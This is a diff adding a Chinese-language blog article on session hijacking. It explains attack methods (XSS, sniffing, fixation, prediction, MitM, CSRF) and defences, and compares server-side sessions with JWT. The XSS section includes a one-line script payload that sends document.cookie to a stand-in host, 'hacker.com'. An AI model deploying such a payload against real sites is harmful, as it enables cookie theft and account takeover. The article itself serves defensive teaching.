@@ -1,0 +1,114 @@
+---
+title: "Session Hijacking"
+date: "2026-01-12"
+description: "Session Hijacking"
+tags: ["session-hijacking"]
+cover: "/og/session-hijacking.png"
+category: "Security"
+---
+
+****  
+### 核心原理
+在 Web 應用中，伺服器是「無狀態」的。為了記住你是誰，伺服器在你登入後會發給你一個 Session ID（通常存存在 Cookie 中）。
+之後你發出的每個請求都會帶著這個 ID。如果黑客拿到了這個 ID，伺服器就會把黑客當成你
+
+****
+### 常見攻擊手段
+#### A. 跨網站腳本攻擊 (XSS) —— 最常見
+- 手法：攻擊者在目標網站注入惡意 JavaScript 代碼。當受害者瀏覽該頁面時，腳本會執行 document.cookie 並將 Session ID 傳送到攻擊者的伺服器。
+```HTML
+<script>fetch('https://hacker.com/steal?c=' + document.cookie)</script>
+```
+
+#### B. 網路嗅探 (Sniffing)
+- 手法：如果網站使用未加密的 HTTP 協定，攻擊者在公共 Wi-Fi 或受控網路中，利用 Wireshark 等工具攔截封包，直接讀取傳輸中的明文 Cookie。
+
+#### C. 會話固定 (Session Fixation)
+- 手法：攻擊者先自己連向網站取得一個有效的 Session ID，再透過連結誘導使用者用這個「預設的 ID」登入。一旦使用者登入成功，該 ID 的權限被提升，攻擊者就能用同一個 ID 同步進入帳號。
+
+#### D. 會話預測 (Session Prediction)
+- 手法：如果系統產生的 Session ID 規律性太強（例如：基於時間戳或單純的遞增數字），攻擊者可以透過演算法猜測出其他在線使用者的有效 ID。
+
+#### E. 中間人攻擊 (MitM)
+- 路徑： 攻擊者將自己置於使用者與伺服器之間（通常透過 ARP 欺騙或偽造 Wi-Fi 熱點）。
+
+- 技術原理：
+    - 如果網站沒有使用 HTTPS，所有封包都是明文傳輸。
+    - 攻擊者利用監聽工具（如 Wireshark）直接在傳送過程抓取 Cookie 欄位中的 Session ID。
+    - 拿到 ID 後，攻擊者直接放入自己的瀏覽器，這就是標準的 Session Hijacking。
+
+- 變體 (SSL Strip)： 即使網站支援 HTTPS，攻擊者若能攔截連線並強制降級回 HTTP（SSL Stripping），依然能竊取 ID。
+
+#### F. 跨網站請求偽造 (CSRF)
+這裡需要精確區分：傳統 CSRF 通常不直接「偷走」Session ID，但它可以實現「冒充身分」的目的。
+然而，有一種特殊的 CSRF 變體可以達到劫持的效果，即 Session Fixation (會話固定)：
+- 路徑： 攻擊者「預設」一個 Session ID 並強迫受害者使用。
+- 技術原理：
+    - 攻擊者先連向目標網站，獲得一個合法的 SID=123。
+    - 利用 CSRF 手段，誘導使用者點擊一個惡意連結，例如：https://bank.com/login?SID=123。
+    - 如果網站設計不當，將 URL 裡的 SID 設定給使用者，且在使用者登入後沒有更換 ID。 
+    - 此時，使用者與攻擊者共用同一個 SID=123。攻擊者成功實現了 Session Hijacking。
+- 補充： 現代瀏覽器的 SameSite 屬性已經大幅削弱了 CSRF 達成此目的的可能性。
+
+****
+### 防範方式
+防範 Session Hijacking 必須從「傳輸安全」、「儲存保護」與「生命週期管理」三個維度下手：
+
+#### A. 強化 Cookie 屬性 (最重要)
+在設定 Session Cookie 時，必須啟用以下安全標籤：
+- HttpOnly：禁止 JavaScript 存取 Cookie，徹底防範 XSS 竊取。
+- Secure：強制 Cookie 只能在加密的 HTTPS 連線中傳輸，防範 Sniffing。
+- SameSite=Lax/Strict：限制跨站請求攜帶 Cookie，輔助防範 CSRF 與部分劫持風險。
+
+#### B. 強制 HTTPS (TLS)
+- 全站實施 HTTPS 並配置 HSTS (HTTP Strict Transport Security)，確保所有通訊皆經過加密，攻擊者無法從網路層嗅探。
+
+#### C. 登入後重置 Session ID
+- 做法：在使用者成功驗證身分（登入）的那一刻，伺服器應立即銷毀舊的 Session ID 並發配一個全新的 ID。這能有效防範會話固定 (Session Fixation)。
+
+#### D. 使用強隨機數產生器
+- 確保 Session ID 是由「密碼學安全」的隨機數產生器生成（如 OpenSSL 的 RAND_bytes），長度需足夠（至少 128 bit），讓攻擊者無法預測。
+
+#### E. 綁定使用者特徵與逾時機制
+- 特徵檢查：在 Session 中紀錄使用者的 IP 地址或 User-Agent，若發生劇烈變動則強制重新登入（需注意行動裝置切換網路的情況）。
+- 逾時管理：設定合理的過期時間，並在使用者點擊「登出」時，確實刪除伺服器端的 Session 紀錄。
+
+****
+### Session ID 實現方式
+主要分為兩大流派：「有狀態的 Session（傳統方式）」 與 「無狀態的 JWT（現代方式）」。
+#### 1. 傳統方式：伺服器端 Session (Stateful)
+這是最經典的做法，PHP、Java Spring、ASP.NET 預設多採用此方式。
+
+- 產生方式：伺服器使用強隨機數產生器（CSPRNG）產生一串長度足夠（通常 128 bit 以上）且無意義的亂碼字串。
+- 儲存位置：
+    - 伺服器端：將這個 ID 存存在記憶體（RAM）、資料庫或 Redis 中，並與該使用者的資料（User ID、權限等）關聯。
+    - 客戶端：存放在 Cookie 中（通常名稱為 JSESSIONID, PHPSESSID 或 sid）。
+- 優點：
+    - 安全性高：資料都在伺服器，客戶端只有一串亂碼。
+    - 易於撤銷：管理員想踢某人下線，只要從 Redis 刪除該 ID 即可。
+
+#### 2. 現代方式：JWT (JSON Web Token / Stateless)
+JWT 嚴格來說不是 Session ID，而是一個**「自帶資料的通行證」**。
+
+- 產生方式：伺服器將使用者資訊（如 User ID、過期時間）用 JSON 包起來，並加上數位簽章（使用私鑰加密）。
+- 儲存位置：
+    - 伺服器端：不儲存。伺服器只負責驗證簽章是否正確。
+    - 客戶端：通常存放在 LocalStorage 或 Cookie 中。
+- 優點：
+    - 可擴展性極強：非常適合「微服務」，因為 A 伺服器產生的 Token，B 伺服器只要有密鑰就能驗證，不需要去問資料庫。
+    - 效能好：減少了資料庫查詢的次數。
+- 缺點：
+    - 難以撤銷：一旦發出，在過期前都有效。除非建立「黑名單」，但這又讓它變回有狀態了。
+
+#### 3. 其他常見的實現技術
+除了上述兩者，資安領域還會看到以下方式：
+
+#### Redis-based Session (主流折衷方案)
+這是目前大型互聯網公司最常用的做法。雖然它是傳統 Session，但透過 Redis（記憶體資料庫）實現。
+
+為什麼用它？ 解決了傳統 Session 無法跨伺服器共享的問題，同時保有「隨時可撤銷」的安全性。
+
+#### UUID / GUID
+有些開發者會直接使用 UUID (Universally Unique Identifier) 作為 Session ID。
+
+風險：並非所有的 UUID 產生器都是「密碼學安全」的。有些 UUID 是根據時間或 MAC 地址產生的，黑客可能預測出下一個 ID。
